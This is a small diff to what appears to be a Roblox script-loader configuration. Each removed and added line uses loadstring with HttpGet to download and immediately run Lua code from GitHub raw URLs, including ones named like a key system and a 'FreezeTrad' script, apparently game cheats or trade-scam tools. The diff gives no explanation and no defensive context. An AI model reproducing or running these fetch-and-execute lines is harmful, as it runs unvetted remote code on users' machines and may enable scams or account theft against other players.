@@ -1,2 +1,3 @@
-HIDE_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/lua-/refs/heads/main/message%20(3).txt", true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/key-system/refs/heads/main/Keieie", true))()
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/real-script/MyOwnLoadingScript/refs/heads/main/Script.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/FreezeTrad-/refs/heads/main/isis", true))()
